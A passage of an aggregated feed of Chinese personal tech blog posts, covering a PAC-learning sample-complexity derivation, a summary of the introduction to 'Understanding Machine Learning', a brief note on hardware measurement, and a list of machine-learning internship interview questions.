元组，且每一个元素都独立于 <span class="math inline">\(m\)</span> 元组其他元素</li></ol><div class="note info"><p><strong>有关 <code>可实现假设</code> 和 <code>独立同分布假设</code> 的补充说明</strong></p><ul><li><code>可实现假设</code> 暗示了在随机的训练样本 <span class="math inline">\(S\)</span> ，<span class="math inline">\(S\)</span> 由从 <span class="math inline">\(\mathcal{D}\)</span> 中采样，又被 <span class="math inline">\(f\)</span> 标记所得，<span class="math inline">\(L_S(h^\star) = 0\)</span> 的可能性为 1。</li><li><code>独立同分布假设</code> 表示每一个 <span class="math inline">\(S\)</span> 中 <span class="math inline">\(x_i\)</span> 都是全新地从 <span class="math inline">\(\mathcal{D}\)</span> 中采样，并被 <span class="math inline">\(f\)</span> 标记后生成的。</li></ul></div><p>此外，定义 <span class="math inline">\(\delta\)</span> 为取得一个不具代表性（<em>nonrepresentative</em>）的样本的<strong>概率</strong>，<span class="math inline">\(1-\delta\)</span> 为预测行为的<strong>置信参数</strong>（<em>confidence parameter</em>）。</p><div class="note info"><p><strong>什么叫不具代表性（<em>nonrepresentative</em>）的样本？</strong></p><ul><li>这个样本不能代表实例的潜在规律。如一个水果本身很好吃，但是碰巧训练样本都是不好吃的，导致学习器学到了错误的结论。其中的不好吃的训练样本即是不具代表性的样本。</li></ul></div><p>由于我们不能确保完美的标签预测，因此这里我们进一步引入另一个用来衡量预测效果的参数，即<strong>精度参数</strong>（<em>accuracy parameter</em>）。其通常记作 <span class="math inline">\(\epsilon\)</span> 。我们用如下公式描述学习器是否获得成功：</p><ul><li>事件 <span class="math inline">\(L_{(\mathcal{D},f)}(h_s)&gt;\epsilon\)</span> 表示学习器的<strong>失败</strong></li><li>事件 <span class="math inline">\(L_{(\mathcal{D},f)}(h_S)\le \epsilon\)</span> 表示学习器的<strong>近似成功</strong>。</li></ul><p>令我们感兴趣的是，在由 <span class="math inline">\(m\)</span> 个实例构成的 <span class="math inline">\(m\)</span> 元组采样，会导致学习器失败的概率的<strong>上界</strong>。</p><p>规范的，记 <span class="math inline">\(S|_{x} = \lbrace x_1,\ \dots,\ x_m\rbrace\)</span> 为训练数据的实例，我们希望找到下式的上界：</p><p><span class="math display">\[\mathcal{D}(\lbrace S|_{x} : L_{(\mathcal{D},f)}(h_{S}) &gt; \epsilon \rbrace)\]</span></p><p>记 <span class="math inline">\(\mathcal{H}_B\)</span> 为“坏的”假设，即</p><p><span class="math display">\[\mathcal{H}_B = \lbrace h\in\mathcal{H}: L_{(\mathcal{D},f)}(h) &gt; \epsilon\rbrace\]</span></p><p>再令</p><p><span class="math display">\[M = \lbrace S|_x : \exists h\in \mathcal{H}_B, L_S(h) = 0 \rbrace\]</span></p><p>显然，<span class="math inline">\(M\)</span> 表示了误导学习器的样本集合。换句话说，对于每一个 <span class="math inline">\(S|_x \in M\)</span> ，存在一个坏的假设，<span class="math inline">\(h\in \mathcal{H}_B\)</span> ，但是在 <span class="math inline">\(S|_x\)</span> 中它看上去是一个好的假设。</p><p>既然可实现假设表示存在 <span class="math inline">\(L_S(h_S) = 0\)</span> ，因此，事件 <span class="math inline">\(L_{(\mathcal{D},f)}(h_s)&gt;\epsilon\)</span> 只可能在这种情况下发生：<span class="math inline">\(h\in \mathcal{H}_B\)</span> ，但是 <span class="math inline">\(L_S(h) = 0\)</span> 。也就是说，<strong>如果我们的采样样本在误导集合中，这种事件才会发生</strong>。因此，我们有：</p><p><span class="math display">\[\lbrace S|_{x} : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace \subseteq M\]</span></p><p>进一步的，<span class="math inline">\(M\)</span> 可改写成：</p><p><span class="math display">\[M = \underset{h\in \mathcal{H}_B}{\bigcup} \lbrace S|_x : L_S(h) = 0\rbrace \tag{2.5}\]</span></p><p>因此，</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le \mathcal{D}^m(M) = \mathcal{D}^m({\cup}_{h\in \mathcal{H}_B} \lbrace S|_x : L_S(h) = 0\rbrace) \tag{2.6}\]</span></p><p>利用 <code>Union Bound</code> 定理，可得：</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le \underset{h\in \mathcal{H}_B}{\sum}\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace)\tag{2.7}\]</span></p><div class="note info"><p><strong>定理（Union Bound）</strong></p><ul><li>对于两个集合 <span class="math inline">\(A\)</span>，<span class="math inline">\(B\)</span> 和分布 <span class="math inline">\(\mathcal{D}\)</span> ，有 <span class="math display">\[\mathcal{D}(A\cup B) \le \mathcal{D}(A) + \mathcal{D}(B)\]</span></li></ul></div><p>由于事件 <span class="math inline">\(L_S(h) = 0\)</span> 等价于 <span class="math inline">\(\forall i, h(x_i) = f(x_i)\)</span> ，所以，</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace) = \mathcal{D}^m(\lbrace S|_x : \forall i, h(x_i) = f(x_i) \rbrace)\]</span></p><p>又因为采样训练样本相互独立，且服从同一个分布 <span class="math inline">\(\mathcal{D}\)</span> ，因此，</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : \forall i, h(x_i) = f(x_i) \rbrace) = \prod_{i=1}^{m}\mathcal{D}(\lbrace x_i : h(x_i) = f(x_i) \rbrace)\]</span></p><p>故有</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace) = \prod_{i=1}^{m}\mathcal{D}(\lbrace x_i : h(x_i) = f(x_i) \rbrace) \tag{2.8}\]</span></p><p>对于训练集中每一个独立的元素，有</p><p><span class="math display">\[{D}(\lbrace x_i : h(x_i) = y_i \rbrace) = 1 - L_{(\mathcal{D},f)}\]</span></p><p>由于 <span class="math inline">\(L_{(\mathcal{D},f)}(h_s)&gt;\epsilon\)</span> ，故</p><p><span class="math display">\[{D}(\lbrace x_i : h(x_i) = y_i \rbrace) = 1 - L_{(\mathcal{D},f)} \le 1 - \epsilon\]</span></p><p>利用 <span class="math inline">\(1-\epsilon \le e^{-\epsilon}\)</span> 不等式对上式放缩，有</p><p><span class="math display">\[{D}(\lbrace x_i : h(x_i) = y_i \rbrace) = 1 - L_{(\mathcal{D},f)} \le 1 - \epsilon \le e^{- \epsilon}\]</span></p><p>将上式带入式（2.8），有</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace)\le (1 - \epsilon)^m \le e^{- m\epsilon} \tag{2.9}\]</span></p><p>结合式（2.7），有</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le |\mathcal{H}_B|e^{- m\epsilon} \le |\mathcal{H}|e^{- m\epsilon}\]</span></p><p>设 <span class="math inline">\(\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le |\mathcal{H}|e^{- m\epsilon}&lt; \delta\)</span> ，则有</p><p><span class="math display">\[m &gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\]</span></p><div class="note info"><p><strong>推导过程</strong></p><p><span class="math display">\[\delta &gt; |\mathcal{H}|e^{-m\epsilon}\]</span></p><p><span class="math display">\[log\delta &gt; log|\mathcal{H}|-m\epsilon\]</span></p><p><span class="math display">\[m\epsilon &gt; log|\mathcal{H}| - log\delta\]</span></p><p><span class="math display">\[m&gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\]</span></p></div><p>综上所述，有如下重要结论：</p><div class="note info"><p>设 <span class="math inline">\(\mathcal{H}\)</span> 为一个有限的假设类，令 <span class="math inline">\(\delta \in (0,1)\)</span> ，<span class="math inline">\(\epsilon &gt; 0\)</span> ，<span class="math inline">\(m\)</span> 为一个满足以下条件的整数： <span class="math display">\[m&gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\]</span> 那么，对于任意的标记函数 <span class="math inline">\(f\)</span> ，任意的分布 <span class="math inline">\(\mathcal{D}\)</span> ，如果满足可实现假设（即，存在 <span class="math inline">\(h\in \mathcal{H}\)</span> ，使得 <span class="math inline">\(L_{(\mathcal{D},f)}(h) = 0\)</span>），则至少有 <span class="math inline">\(1-\delta\)</span> 的可能性，在 <span class="math inline">\(S\)</span> 上独立采样 <span class="math inline">\(m\)</span> 个点，对于每一个 <span class="math inline">\(ERM\)</span> 假设，满足如下式子： <span class="math display">\[L_{(\mathcal{D},f)}(h_S) \le \epsilon\]</span></p></div><p>这个结论意味着，只要有足够的训练数据（<span class="math inline">\(m&gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\)</span>），在有限假设类上的 <span class="math inline">\(ERM_{\mathcal{H}}\)</span> 会尽可能近似正确（其置信参数为 <span class="math inline">\(1-\delta\)</span> ，最大的误差为 <span class="math inline">\(\epsilon\)</span>）。</p><h1 id="reference">Reference</h1><p>Shai Shalev-Shwartz, Shai Ben-David. <a href="https://www.cs.huji.ac.il/~shais/UnderstandingMachineLearning/index.html" target="_blank" rel="noopener">Understanding Machine Learning: From Theory to Algorithms</a></p>]]></content>
        <author>
            <name><![CDATA[CosmosNing的个人博客]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/09/13/intro-to-ml/</id>
        <title><![CDATA[《从理论到算法理解机器学习》引言]]></title>
        <updated>2021-05-14T12:17:25+08:00</updated>
        <link href="https://cosmosning.github.io/2020/09/13/intro-to-ml/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/09/13/intro-to-ml/"><![CDATA[<blockquote><p>最近上了一门课，叫做“智能信息检索”。老师推荐了一本教材 《Understanding Machine Learning: From Theory to Algorithms》（文末提供官方下载链接），来解释<strong>智能</strong>的含义。本文基于我对教材的理解，对其引言部分做了一些要点概括，供读者参考。</p></blockquote><h1 id="what-is-learning">What Is Learning？</h1><p>粗略地讲，<strong>学习是一个将经历（<em>experience</em>）转换为技能（<em>expertise</em>）或知识（<em>knowledge</em>）的过程</strong>。一般地，一个学习算法的<strong>输入</strong>是<strong>训练数据</strong>（代表经历），<strong>输出</strong>是<strong>技能</strong>。</p><p>一种常见的学习方法是 “记忆学习”（<em>learning by memorization</em>）。类似人类学习的“死记硬背”，这种学习方法有时候十分有效，但是它却缺失了学习系统中一个十分重要的能力，即<strong>泛化能力</strong>（<em>generalization</em>）。换句话讲，一个成功的学习系统理应能够依据已知知识，正确处理未知的情况。</p><div class="note info"><p><strong>泛化能力</strong> （<em>generalization</em>） 有时也被称作<strong>归纳推理</strong> （<em>inductive reasoning / inductive inference</em>）</p></div><p>然而，<strong>归纳推理可能会导致错误结论</strong>。那么怎样才能减少犯错呢？</p><p>答案是：在学习系统中<strong>引入先验知识</strong>（<em>prior knowledge</em>）！</p><div class="note info"><p><strong>先验知识</strong>（<em>prior knowledge</em>） 有时也被称作<strong>归纳偏好</strong> （<em>inductive bias</em>）</p></div><p>从书中举得几个例子来看，<strong>引入先验知识，使整个学习过程带有偏好，是一个成功的学习算法必然发生的事情</strong>（这种现象是 <strong>No-Free-Lunch Theorem</strong> 的具体表现）。粗略来说，学习算法开始训练时所引入的先验知识越强，从训练样本中学习就越简单。但是，先验知识越强，学习的灵活性也就越低，因为整个学习过程被这些预定假设束缚住了。</p><h1 id="when-we-need-machine-learning">When We Need Machine Learning？</h1><p>那么，在哪些情况下，我们需要利用机器学习解决问题呢？主要有以下两个方面：</p><ul><li>问题的复杂性（<em>complexity</em>）</li><li>任务的适应性需求（<em>adaptivity</em>）</li></ul><h2 id="tasks-that-are-to-complex-to-program">Tasks That Are to Complex to Program</h2><ul><li><em>Tasks Performed by Animals / Humans</em>：我们暂时无法理解一些我们能够处理的日常任务，例如驾驶汽车、语音识别、图像理解。以现有的知识，难以抽象出一个良好的程序去执行这些任务。然而，先进的机器学习程序，只要接受足够的训练样本训练，就可以从中学习经验，并在这些任务中达到不错的效果。</li><li><em>Tasks beyond Human Capabilities</em>：另一类适合用机器学习解决的问题是对巨大的且复杂的数据（例如宇宙空间数据、医疗数据、天气数据等）进行分析。这些数据的处理和分析通常超越了我们自身的分析能力。使用机器学习，可以充分利用计算机的能力，找到数据中有价值的信息。</li></ul><h2 id="adaptivity">Adaptivity</h2><ul><li>预先编程的程序有一个缺陷，即死板性（<em>rigidity</em>）。也就是说，一旦程序写好了，安装到系统中后，程序就不会变化了。然而，现实中许多任务都是在不断变化的。</li><li>而机器学习（其天生可以适应不同的输入数据）提供了一种解决此类任务的方案。</li></ul><h1 id="types-of-learning">Types of Learning</h1><h2 id="supervised-versus-unsupervised">Supervised versus Unsupervised</h2><p>如果将学习看作是一个“利用经历来获取技能”的过程，那么监督学习和非监督学习可以描述如下：</p><ul><li><strong>监督（<em>Supervised</em>）学习</strong>：在该场景中，“经历”（亦可称作训练样本）包含了十分重要的信息；而这些信息却在测试样本中丢失了。从监督学习中学习到的技能的目标是，预测测试数据中的确实信息。这就好像环境作为一名老师通过提供额外的信息（通常称作<strong>“标签”</strong> <em>label</em>）"监督"学生（学习算法）的学习。</li><li><strong>非监督（<em>Unsupervised</em>）学习</strong>：对于非监督学习来说，训练数据和测试数据几乎没什么区别。通常，这种学习方法通过处理输入数据，来达到<strong>总结数据</strong>、<strong>压缩数据</strong>的目标。<strong>聚类</strong>——将一个数据集分成几个子集，同一子集具有相似性——是非监督学习中一个典型的例子。</li><li>在监督与非监督之间，还存在一种不同的方法——<strong>强化学习</strong>。</li></ul><h2 id="active-versus-passive">Active versus Passive</h2><ul><li><strong>主动（<em>Active</em>）学习</strong>：主动学习在在训练过程中将会与环境交互。</li><li><strong>被动（<em>Passive</em>）学习</strong>：被动学习只会观测环境所提供的信息，而不会影响（influence）或指导（direct）它。</li></ul><div class="note info"><p><strong>例子</strong></p><ul><li>垃圾邮件识别通常是被动学习，因为它等着用户为它标记收到的邮件是否是垃圾邮件。</li><li>在主动学习的场景下，学习算法会在训练过程中要求用户标记它指定的邮件，或者甚至是由学习算法生成的邮件，来增强它对什么是垃圾邮件的理解。</li></ul></div><h2 id="helpful-of-the-teacher">Helpful of the Teacher</h2><ul><li>主动提供信息<ul><li>训练信息<strong>正相关</strong>——普通学习：例如，教师会不断尝试为学生提供最有用的信息，来达到某种学习目标。</li><li>训练信息<strong>负相关</strong>——<strong>对抗（<em>Adversarial</em>）学习</strong>：例如垃圾邮件生成器将会努力误导垃圾邮件识别器。</li></ul></li><li>被动提供信息<ul><li><strong>统计学习（<em>Statistical Learning</em>）</strong>：有时候，信息并不是他人主动提供的。例如科学家在认识自然时，环境，作为一位老师，并不会根据学生的需求主动的提供信息，因此是被动的提供信息。这种情况下，输入数据常常被认为是由某种随机过程（<em>random process</em>）产生。这样，就可以使用统计学习解决问题</li></ul></li></ul><h2 id="online-versus-batch-learning-protocol">Online versus Batch Learning Protocol</h2><ul><li><strong>在线学习（<em>Online Learning</em>）</strong>：学习算法必须在训练过程中，在线反馈。例如，股票交易员需要基于目前位置积累的经验，做出每日决策。虽说随着时间推移，他会称为一名专家，但是也可能在此过程中犯下代价高昂的错误。</li><li><strong>批处理学习（<em>Batch Learning</em>）</strong>：只有在处理大量的数据后，该算法才能获得所需的技能。在数据挖掘场景下，数据挖掘算法会处理大量的数据之后，才会得出相关的结论。</li></ul><h1 id="relations-to-other-fields">Relations to Other Fields</h1><h2 id="with-ai">With AI</h2><ul><li>机器学习是 AI 的一个分支。</li><li>机器学习更关注<strong>利用计算机的优势和独特的能力</strong>来<strong>补充</strong>人类的智能，因此常常处理一些远超人类能力的任务。</li><li>AI 更关注创造一个能够自动<strong>模仿</strong>智能行为的机器。</li></ul><h2 id="with-statistics">With Statistics</h2><ul><li>统计学：提出假设（专业人员） <span class="math inline">\(\rightarrow\)</span> <strong>验证假设</strong>（统计学）</li><li>机器学习：利用数据，<strong>挖掘规律</strong>，解释原因。</li><li>机器学习对<strong>算法</strong>层面的考虑更多</li><li>统计学常常关注数据的<strong>渐进性</strong>（<strong>无穷</strong>情况下的特性），机器学习则关注<strong>有限</strong>的样本空间</li><li>统计学通常<strong>预先假设数据分布</strong>，而机器学习是<strong>分布无关</strong>的（<em>distribution-free</em>）</li></ul><h1 id="reference">Reference</h1><p>Shai Shalev-Shwartz, Shai Ben-David. <a href="https://www.cs.huji.ac.il/~shais/UnderstandingMachineLearning/index.html" target="_blank" rel="noopener">Understanding Machine Learning: From Theory to Algorithms</a></p>]]></content>
        <author>
            <name><![CDATA[CosmosNing的个人博客]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/621</id>
        <title><![CDATA[硬件只谈概率，软件才有是非]]></title>
        <updated>2021-05-12T13:28:44+08:00</updated>
        <link href="https://www.suruifu.com/posts/621"/>
        <content type="text/html" src="https://www.suruifu.com/posts/621"><![CDATA[<p>最近做了一点硬件开发工作。</p>
<p>要想控制一个东西，首先要测得准。测控测控，测是控的基础和基石。</p>
<p>对应在编程工作中，要想控制一个模块，首先要有接口获取到模块的相关状态。</p>
<p>但是如果当测量本身都会破坏模块工作状态的时候，就变成了不可测量模块的控制。这个时候所有问题都是概率性的。不能以绝对的是非眼光来看待。</p>
<p>那为什么我们电脑显示器这么稳定呢？我想一方面是测试做得够，掌握了一点这种概率性的规律（电子云图）。另一方面是性能很高，冗余量很大。</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2021/03/23/2021%E6%9A%91%E5%81%87%E5%AE%9E%E4%B9%A0%E9%9D%A2%E7%BB%8F%E5%A4%87%E4%BB%BD/</id>
        <title><![CDATA[2021暑假实习面经备份]]></title>
        <updated>2021-04-25T11:57:33+08:00</updated>
        <link href="https://www.logicjake.xyz/2021/03/23/2021%E6%9A%91%E5%81%87%E5%AE%9E%E4%B9%A0%E9%9D%A2%E7%BB%8F%E5%A4%87%E4%BB%BD/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2021/03/23/2021%E6%9A%91%E5%81%87%E5%AE%9E%E4%B9%A0%E9%9D%A2%E7%BB%8F%E5%A4%87%E4%BB%BD/"><![CDATA[<p>过完年以来好像就一直在准备暑假实习的事情，投了不少简历，面试了（和待面试）很多公司，积累了不少面经。虽然面经都在牛客发过，但总信不过把自己的东西放在别人的网站上，这里纯当做个备份吧。</p><h1 id="卡牛科技"><a href="#卡牛科技" class="headerlink" title="卡牛科技"></a>卡牛科技</h1><p>面试流程非常快，基本一天一个流程。面试官和 HR 也很好，主要围绕项目做一些扩展。公司主要算法业务为广告推荐，最近新引入了电商，做商品推荐。实习生可以住公司统一安排的二人间公寓。</p><h2 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h2><ol><li>介绍比赛项目，前排用的什么方案</li><li>机器学习方法和深度学习方法的应用场景</li><li>为什么使用 lightgbm 模型，优缺点</li><li>简述 word2vec 的技巧</li><li>transformer在序列模型中大放异彩，你认为他和传统的rnn模型相比强在哪里？</li><li>工程实践问题，项目中类别分布不平衡怎么办，负样本多怎么办</li><li>如果使用了下采样破坏了真实分布，如何在上线之后将预测的概率拉回真实的分布</li></ol><h2 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h2><ol><li>介绍比赛流程</li><li>对冷门商品的解决方法</li><li>如何保证召回的多样性</li><li>如何推荐新上架商品</li><li>模型推荐购买过的商品怎么处理</li><li>lightgbm 与 xgboost 区别</li><li>广告反欺诈中如果给 GPS 信息怎么处理</li></ol><h1 id="蚂蚁金服—支付宝—广告算法"><a href="#蚂蚁金服—支付宝—广告算法" class="headerlink" title="蚂蚁金服—支付宝—广告算法"></a>蚂蚁金服—支付宝—广告算法</h1><p>阿里好多部门在过完年之后就开始在各大群里发 jd，声势十分浩大。群里有人发了支付宝部门的 jd，说是有学长直推，而且方向和我很匹配，就去联系了一下学长，学长很 nice，帮我改简历，提了很多建议。阿里支持预先面，也是我第一次大厂面试，总共两轮技术面，本来有的交叉面被取消了。</p><h2 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h2><ol><li>映象比较深刻的比赛</li><li>在 kdd cup 竞赛中负责内容</li><li>介绍改进的itemcf</li><li>用户 embedding 和商品 embedding 不在一个特征空间，怎么计算相似性</li><li>有没有考虑把用户和商品的关系建为异构图</li><li>后处理如何打压热门商品</li><li>介绍 kdd cup 第一名的方案</li><li>介绍竞赛广告反欺诈的比赛</li></ol><h2 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h2><p>二面应该是个领导，约的会议室快到时间了，所以问的比较简单，了解了一下竞赛项目和到岗时间就没了。</p><h1 id="字节跳动—商业变现—广告算法"><a href="#字节跳动—商业变现—广告算法" class="headerlink" title="字节跳动—商业变现—广告算法"></a>字节跳动—商业变现—广告算法</h1><p>本来想把字节放在后面投的，所以只在系统里填了简历，没有投岗位，但 HR 加微信问我要不要试试他们部门，所以就阴差阳错开始了，总共三轮技术面。</p><h2 id="一面-2"><a href="#一面-2" class="headerlink" title="一面"></a>一面</h2><p>算法题：leetcode 排序矩阵查找，leetcode 102 二叉树的层序遍历</p><ol><li>介绍一个你认为做的最好的比赛</li><li>ANN用的什么工具，介绍一下原理</li><li>为什么选择Annoy</li><li>还知道其他ANN算法吗？介绍了一下局部敏感hash</li><li>做用户商品交互特征的时候，你知道业界是怎么做的？扯了一下DIN模型的和目标商品的attention做法</li><li>lightgbm和xgboost的区别</li><li>排序阶段你知道业界是怎么做的？说了一下点击率模型：deepfm，nfm，wide &amp; deep，dcn，deepcrossing</li><li>介绍一下word2vec</li><li>介绍一下transformer</li><li>bert的两种预训练方式</li><li>为什么要用mask？说了padding mask和sequence mask</li><li>为什么要sequence mask？防止信息穿越</li></ol><h2 id="二面-2"><a href="#二面-2" class="headerlink" title="二面"></a>二面</h2><p>算法题：求从左上角到右下角的最小开销。给定一个二维数组arr[i][j]，数组中每个点表示经过该点的开销，求从左上角为起点，右下角为终点的最小开销，在每个点时只能往右或者往下走，同时中途可能会有障碍，即有些点不能走，obs[i][j]=1时表示(i, j)不能走。dp和dp状态压缩。</p><ol><li>介绍一个比赛</li><li>ANN用的什么工具，介绍一下原理</li><li>如何提高冷门商品的推荐效果的</li><li>了不了解大数据框架</li><li>说一下你熟悉的linux命令</li><li>一个文件每行一个数字，用命令统计所有数的平均值和数字个数</li><li>逻辑回归损失函数和求导</li><li>介绍一下你了解的优化器和各自的优缺点</li><li>Adam和Adagrad的区别</li></ol><h2 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h2><p>算法题：有一个长度为n的数组，求一个数k，k的取值区间为[1, n-1]，使得数组的前k个数和后n-k个数的方差和最小。要求化简方差公式，达到计算子序列方差的时间复杂度为O(n)。解出来后又要求空间复杂度为常数级别。</p><ol><li>写逻辑回归的logloss损失函数</li><li>逻辑回归损失函数可以用mse吗（从梯度角度）</li><li>逻辑回归建模，如果只有9个正样本，一个负样本，那么有一列特征，这个特征对于的权重是正还是负  </li><li>介绍认为做的最好的项目</li><li>项目中如何缓解曝光偏差的</li><li>Embedding ANN召回用的什么工具</li></ol><h1 id="快手-社区科学部-推荐算法"><a href="#快手-社区科学部-推荐算法" class="headerlink" title="快手-社区科学部-推荐算法"></a>快手-社区科学部-推荐算法</h1><p>快手是先统一面试，技术面结束后，HR 联系才知道具体的小组。快手的面试风格感觉和字节很像，先做两道算法题。一面先做题，第二题卡了好久才做完，所以剩下的时间不多，面试官也没多问，就简单了解了一下竞赛项目。二面也是先做题，基础问的不多，也问到了“逻辑回归损失函数可以用mse吗”，大部分时间都在和我讨论 kdd cup 的项目流程是否合理和为什么要这么做。快手总共两轮技术面，隔了大概两周才有 HR 沟通后续。</p><h1 id="腾讯-应用宝-推荐算法"><a href="#腾讯-应用宝-推荐算法" class="headerlink" title="腾讯-应用宝-推荐算法"></a>腾讯-应用宝-推荐算法</h1><p>投的腾讯微视，被应用宝捞了。</p><h2 id="一面-3"><a href="#一面-3" class="headerlink" title="一面"></a>一面</h2><ol><li>介绍一个最有把握的比赛</li><li>介绍比赛中itemcf具体做法</li><li>在itemcf中如何引入时间间隔信息和位置间隔信息</li><li>基于商品属性embedding的召回这么做的</li><li>Annoy的原理</li><li>基于w2v的ANN怎么做的</li><li>w2v的原理</li><li>w2v的loss函数</li><li>loss函数还有哪些</li><li>如何解决冷启动问题</li><li>如何评价召回的效果</li><li>如何把召回的信息引入到排序</li><li>GBDT，xgboost，lightgbm改进的过程</li><li>简单推导xgboost</li><li>构建一棵树分裂特征怎么选择</li><li>计算分裂增益的方法有哪些</li><li>LSTM的门机制</li><li>LSTM相较于RNN的优势</li><li>transformer的机制</li><li>推荐里面深度模型的了解</li><li>NN怎么达到泛化性</li><li>如何保证的稀疏性</li><li>L1正则为什么可以达到模型的稀疏性</li></ol><h2 id="二面-3"><a href="#二面-3" class="headerlink" title="二面"></a>二面</h2><ol><li>比赛分工</li><li>embedding存在之前没有出现过id怎么办</li><li>w2v的样本怎么构造</li><li>有没有过滤低频id</li><li>cbow 与 skip-gram 的区别和优缺点</li><li>多任务学习有哪些结构</li><li>多个召回怎么合并的</li><li>多个召回分数之间是可比的吗</li><li>各个召回的权重是怎么选取的</li><li>推荐系统里面是如何考虑冷门商品</li><li>新增一路召回，在排序阶段需要做什么改进</li><li>树模型对离散特征怎么处理的</li><li>树模型怎么决定一个叶子结点是否要分裂</li><li>xgboost正则化项和什么有关</li></ol><h2 id="三面-1"><a href="#三面-1" class="headerlink" title="三面"></a>三面</h2><p>做了三道算法题：leetcode 53.最大子序和，leetcode 75.颜色分类，leetcode 442.数组中重复的数据</p><h2 id="四面"><a href="#四面" class="headerlink" title="四面"></a>四面</h2><ol><li>介绍项目</li><li>算法题：剑指 Offer 60.n个骰子的点数</li></ol><h1 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h1><p>应该是百度的实习专场，三轮技术连着面。</p><h2 id="一面-4"><a href="#一面-4" class="headerlink" title="一面"></a>一面</h2><p>算法题：leetcode 70.爬楼梯</p><ol><li>介绍竞赛项目</li><li>竞赛数据规模</li><li>ANN中用户的embedding怎么得到的</li><li>w2v的召回具体怎么做的</li><li>ANN的工具用的啥</li><li>基于深度的召回怎么做的</li><li>排序阶段的特征有哪些</li><li>后打压怎么做的</li></ol><h2 id="二面-4"><a href="#二面-4" class="headerlink" title="二面"></a>二面</h2><p>算法题：假设现在有很多海岛，有些海岛之间有桥连接，你已知海岛连接情况。 ① 我现在想从到 A岛 去 B岛，问是否能通过陆路到达（过桥） ②如果可以，最少需要过几次桥 ③输出一条最短的路径 （P.S. 最好可以写一个非递归的形式）</p><ol><li>介绍竞赛</li><li>评估标准是啥</li><li>哪些特征比较有用</li><li>多路召回的分数为什么要相加</li><li>有没有分析 bad case</li><li>优化思路</li><li>讲一下推荐的方法</li><li>一个全连接层有多少参数</li><li>介绍 attention</li></ol><h2 id="三面（手百搜索部门）"><a href="#三面（手百搜索部门）" class="headerlink" title="三面（手百搜索部门）"></a>三面（手百搜索部门）</h2><ol><li>介绍研究方向</li><li>论文中 embedding 效果的评价方法和指标</li><li>为什么选择数据挖掘这个方向</li><li>对于实习的目标</li><li>反问部门业务和技术栈</li></ol><h1 id="美团-外卖-搜索算法"><a href="#美团-外卖-搜索算法" class="headerlink" title="美团-外卖-搜索算法"></a>美团-外卖-搜索算法</h1><h2 id="一面-5"><a href="#一面-5" class="headerlink" title="一面"></a>一面</h2><ol><li>介绍竞赛</li><li>工程挑战有哪些</li><li>介绍transformer</li><li>介绍self-attention</li><li>算法题：Leetcode 8. 字符串转换整数 (atoi)，考虑科学计数法</li></ol><h2 id="二面-5"><a href="#二面-5" class="headerlink" title="二面"></a>二面</h2><p>算法题：合并两个有序数组并去重</p><ol><li>介绍竞赛</li><li>如何提高冷门商品的推荐效果</li><li>为什么能缓解冷门商品的召回</li><li>怎么评价冷门商品的推荐效果</li><li>排序特征如何对冷门商品做倾向的</li><li>根据点击次数提权，整体效果会下降吗</li><li>如何平衡全量商品和冷门商品的指标</li><li>如何使用点击序列的</li><li>为什么使用lightgbm</li><li>lightgbm，xgboost的原理</li><li>如何训练embedding</li><li>概率题：有两个无限大且不透明的箱子，100个白球和100个黑球。100个白球和100个黑球可以任意放置在两个箱子里，求能摸到黑球的最大概率</li></ol><h1 id="华为-消费者云服务部-AI工程师"><a href="#华为-消费者云服务部-AI工程师" class="headerlink" title="华为-消费者云服务部-AI工程师"></a>华为-消费者云服务部-AI工程师</h1><p>刚投待捞</p><h1 id="网易和网易游戏"><a href="#网易和网易游戏" class="headerlink" title="网易和网易游戏"></a>网易和网易游戏</h1><p>待捞捞</p>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2021/02/07/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E6%96%B0%E9%97%BB%E6%8E%A8%E8%8D%90%E6%AD%A3%E5%BC%8F%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%88%86%E4%BA%AB/</id>
        <title><![CDATA[零基础入门推荐系统新闻推荐正式赛-赛后分享]]></title>
        <updated>2021-04-25T11:57:33+08:00</updated>
        <link href="https://www.logicjake.xyz/2021/02/07/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E6%96%B0%E9%97%BB%E6%8E%A8%E8%8D%90%E6%AD%A3%E5%BC%8F%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%88%86%E4%BA%AB/"/>
